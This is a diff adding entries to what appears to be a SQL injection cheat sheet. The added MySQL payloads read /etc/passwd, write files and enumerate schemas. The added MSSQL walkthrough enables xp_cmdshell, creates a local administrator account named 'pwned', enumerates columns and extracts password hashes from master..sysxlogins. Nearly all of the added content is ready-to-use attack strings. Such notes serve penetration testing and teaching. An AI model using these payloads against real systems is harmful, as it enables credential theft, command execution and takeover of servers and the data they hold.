@@ -67,8 +67,15 @@ MySql injection, UNION operator
         AND 1=0 UNION SELECT LOAD_FILE('C:\\boot.ini'),NULL,NULL #'
     Write files
         AND 1=0 UNION SELECT 'bad content',NULL,NULL INTO OUTFILE 'C:\\random_file.txt' #'
+    Other payloads:
+    *-1 union all select @@version --
+1 union SELECT user FROM mysql.user
+1 union select 'foo' into outfile('/tmp/foo')
+1 union select load_file('/etc/passwd')*
 
-
+Leak database
+    Find databases
+    *SELECT schema_name FROM information_schema.schemata limit 1,2*
 Tricks to read data
     Exfiltrate the different rows of the table. First, find the number of rows in the table:
     *aa' UNION SELECT count(*), users.password FROM users; --*
@@ -169,3 +176,42 @@ or true--
 ") or ("x")=("x
 ")) or (("x"))=(("x*
 
+Mssqli exploitation
+    Find injectable parameter, doing do boolean based:
+    *1002' or '1'='1
+1002' and '1'='1
+1002' and '1'='2*
+
+    Find injectable parameter with time delays:
+    *XX'; WAITFOR DELAY '0:0:5'--*
+    If it works you can try to enable xp_cmdshell:
+    *EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;*
+
+    Test xp_cmdshell using a time delay:
+    *';exec master..xp_cmdshell 'ping -n 5 127.0.0.1'; --*
+
+    Add user
+    *';exec master..xp_cmdshell 'net user pwned 1234 /ADD && net localgroup administrators pwned /ADD'; --*
+
+If it did not work, try enumerating the database. Find col until no error tells you the columns:
+    *1002' ORDER BY 1--
+1002' ORDER BY 2--
+1002' ORDER BY 3--*
+
+    Run union query with num of cols:
+    *1002' UNION ALL SELECT null,NULL,NULL,NULL--*
+
+    Get data:
+    *ID=1002' UNION ALL SELECT NULL,+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)),NULL,NULL--
+ID=1002' UNION ALL SELECT NULL,+ISNULL(CAST(HOST_NAME() AS NVARCHAR(4000)),CHAR(32)),NULL,NULL--
+ID=1002' UNION ALL SELECT NULL,+ISNULL(CAST(INJECTED_FUNCTION AS NVARCHAR(4000)),CHAR(32)),NULL,NULL--
+
+DB_NAME()
+user_name();
+system_user*
+
+    Get hashes
+    *1002' UNION ALL SELECT NULL,CHAR(113)+ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32))+CHAR(98)+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS NVARCHAR(4000)),CHAR(32))+CHAR(113),NULL,NULL FROM master..sysxlogins--*
